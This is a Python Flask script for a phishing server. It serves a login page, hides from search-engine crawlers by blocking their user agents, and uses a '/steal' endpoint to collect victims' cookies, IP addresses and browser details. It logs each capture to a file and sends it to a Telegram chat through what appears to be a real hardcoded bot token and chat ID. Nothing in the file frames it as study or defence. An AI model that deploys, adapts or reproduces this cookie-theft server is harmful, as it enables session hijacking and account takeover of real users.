from flask import Flask, request, render_template
import os
from datetime import datetime
import requests

app = Flask(__name__)

# ✅ Telegram credentials
BOT_TOKEN = "7599021313:AAFmH8Ch1-KypyK0Ez2Ot-hYQ8TS7vcGLmE"
CHAT_ID = "6908281054"

# ✅ Bot User-Agents to block
BLOCKED_AGENTS = [
    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot",
    "Baiduspider", "YandexBot", "Sogou", "Facebot", "ia_archiver"
]

# ✅ Ensure log folder exists
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# ✅ Function to send Telegram alert
def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": msg
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram error: {e}")

# ✅ Homepage route
@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent', '')
    if any(bot in user_agent for bot in BLOCKED_AGENTS):
        return "Access Denied", 403
    return render_template('login.html')

# ✅ Cookie steal endpoint
@app.route('/steal', methods=['POST'])
def steal():
    cookie = request.form.get('cookie', 'null')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'unknown')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ✅ Bot block
    if any(bot in user_agent for bot in BLOCKED_AGENTS):
        return "", 204

    # ✅ Save locally
    log_data = f"[{timestamp}]\nIP: {ip}\nUA: {user_agent}\nCookie: {cookie}\n{'='*60}\n"
    with open(os.path.join(LOG_DIR, 'cookies.txt'), 'a') as f:
        f.write(log_data)

    # ✅ Send to Telegram
    message = f"""🕵️ New Target Detected!
🕓 Time: {timestamp}
🌐 IP: {ip}
🧭 UA: {user_agent}
🍪 Cookie: {cookie}"""
    send_telegram(message)

    return "", 204

# ✅ Start server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
